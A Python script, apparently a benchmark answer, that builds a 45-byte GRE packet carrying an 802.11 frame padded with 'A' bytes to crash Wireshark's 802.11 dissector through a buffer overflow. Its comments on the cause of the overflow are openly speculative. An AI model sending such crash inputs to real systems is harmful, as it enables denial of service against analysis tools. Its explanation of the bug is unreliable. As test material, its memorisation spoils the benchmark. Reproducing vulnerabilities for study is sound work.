import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # GRE header structure:
        # - Flags and version (2 bytes): bit 0=C, bit 1=R, bit 2=K, bit 3=S, bits 4-12=Reserved, bits 13-15=Version
        # - Protocol Type (2 bytes): 0x820D for 802.11
        
        # Build GRE packet that will trigger the vulnerable 802.11 dissector
        # The overflow likely occurs when the 802.11 dissector processes the pseudoheader
        # but the GRE dissector only provides flags+version instead of full radio info
        
        # GRE header (minimal):
        # Flags: C=0, R=0, K=0, S=0, Reserved=0, Version=0
        flags_version = 0x0000
        # Protocol type for 802.11 in Wireshark's gre.proto
        protocol = 0x820D
        
        # Build packet with minimal valid 802.11 frame after GRE header
        # The 802.11 dissector expects a pseudoheader but gets flags+version instead
        # causing buffer overflow when accessing radio information fields
        
        # We need exactly 45 bytes total (ground truth length)
        # GRE header: 4 bytes
        # Remaining: 41 bytes for triggering overflow
        
        # Structure:
        # 1. GRE header (4 bytes)
        # 2. 802.11 frame control field (2 bytes)
        # 3. Destination MAC (6 bytes)
        # 4. Source MAC (6 bytes)
        # 5. BSSID (6 bytes)
        # 6. Sequence control (2 bytes)
        # 7. Remaining bytes to trigger overflow in radio info processing
        
        gre_header = struct.pack('>HH', flags_version, protocol)
        
        # 802.11 frame (data frame, no QoS)
        frame_control = 0x0800  # Data frame, from DS
        
        # Random MAC addresses
        dest_mac = b'\xaa\xaa\xaa\xaa\xaa\xaa'
        src_mac = b'\xbb\xbb\xbb\xbb\xbb\xbb'
        bssid = b'\xcc\xcc\xcc\xcc\xcc\xcc'
        
        sequence_control = 0x0000
        
        # Additional data to trigger overflow in radio info processing
        # The 802.11 dissector expects radio information structure but
        # instead gets the flags+version which is only 2 bytes
        # When it tries to read radio header fields (which are larger),
        # it causes stack buffer overflow
        
        # Fill remaining bytes with pattern that maximizes chance of crash
        remaining_bytes = 41 - (2 + 6 + 6 + 6 + 2)  # 19 bytes remaining
        
        # Create payload that will overflow when dissector reads beyond bounds
        overflow_data = b'A' * remaining_bytes
        
        packet = (
            gre_header +
            struct.pack('<H', frame_control) +
            dest_mac +
            src_mac +
            bssid +
            struct.pack('<H', sequence_control) +
            overflow_data
        )
        
        # Verify total length is 45 bytes
        assert len(packet) == 45
        
        return packet